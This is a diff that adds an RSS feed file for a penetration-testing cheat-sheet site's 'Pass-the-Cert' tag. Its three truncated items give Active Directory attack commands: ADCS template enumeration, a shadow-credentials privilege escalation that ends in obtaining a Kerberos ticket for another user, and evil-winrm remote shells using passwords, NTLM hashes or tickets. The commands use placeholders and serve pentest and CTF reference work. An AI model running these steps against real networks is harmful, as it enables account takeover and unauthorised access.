@@ -1,0 +1,32 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Pass-the-Cert on TLDRBins</title>
+    <link>https://tldrbins.github.io/@pass-the-cert/</link>
+    <description>Recent content in Pass-the-Cert on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@pass-the-cert/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>ADCS</title>
+      <link>https://tldrbins.github.io/adcs/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/adcs/</guid>
+      <description>Enum (From Linux) certipy-ad nxc certipy-ad find -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -target &amp;lt;TARGET&amp;gt; -text -stdout -vulnerable nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -M adcs Enum (From Windows) powershell certify ADCSTemplate # Check ADCS service net start | findstr /i cert # Check env certutil # List cert templates certutil -catemplates # Get info of each template .\certify.exe find # Find vuln templates .\certify.exe find /vulnerable /currentuser # Import ADCSTemplate module import-module .</description>
+    </item>
+    <item>
+      <title>AddKeyCredentialLink</title>
+      <link>https://tldrbins.github.io/addkeycredentiallink/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/addkeycredentiallink/</guid>
+      <description>Privesc #1: Shadow credentials Linux Windows 0. Pre-check [optional] python3 pywhisker.py --action list -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --dc-ip &amp;lt;DC&amp;gt; -t &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; --use-ldaps 1. Add shadow credentials python3 pywhisker.py --action add -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --dc-ip &amp;lt;DC&amp;gt; -t &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; --use-ldaps # Fix module &amp;#39;OpenSSL.crypto&amp;#39; has no attribute &amp;#39;PKCS12Type&amp;#39; pip3 install -I pyopenssl==24.0.0 2. Request TGT using the PFX sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; python3 gettgtpkinit.py -cert-pfx &amp;lt;PFX_FILE&amp;gt; -pfx-pass &amp;#39;&amp;lt;GENERATED_PASSWORD&amp;gt;&amp;#39; &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;TARGET_USER&amp;gt;&amp;#39; &amp;lt;TARGET_USER&amp;gt;.</description>
+    </item>
+    <item>
+      <title>evil-winrm</title>
+      <link>https://tldrbins.github.io/evil-winrm/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/evil-winrm/</guid>
+      <description>Connection Methods Password Hash Kerberos crt &amp; key evil-winrm -i &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; evil-winrm -i &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -H &amp;lt;HASH&amp;gt; # Step 1: Edit &amp;#39;/etc/krb5.conf&amp;#39; (All in uppercase) [libdefaults] default_realm = &amp;lt;DOMAIN&amp;gt; [realms] &amp;lt;DOMAIN&amp;gt; = { kdc = &amp;lt;DC&amp;gt;:88 admin_server = &amp;lt;DC&amp;gt; default_domain = &amp;lt;DOMAIN&amp;gt; } [domain_realm] .domain.internal = &amp;lt;DOMAIN&amp;gt; domain.internal = &amp;lt;DOMAIN&amp;gt; # Step 2: export .ccache export KRB5CCNAME=&amp;lt;CCACHE&amp;gt; # Step 3: Connect sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; evil-winrm -i &amp;lt;TARGET&amp;gt; -r &amp;lt;DC&amp;gt; evil-winrm -i &amp;lt;TARGET&amp;gt; -S -k auth.</description>
+    </item>
+  </channel>
+</rss>
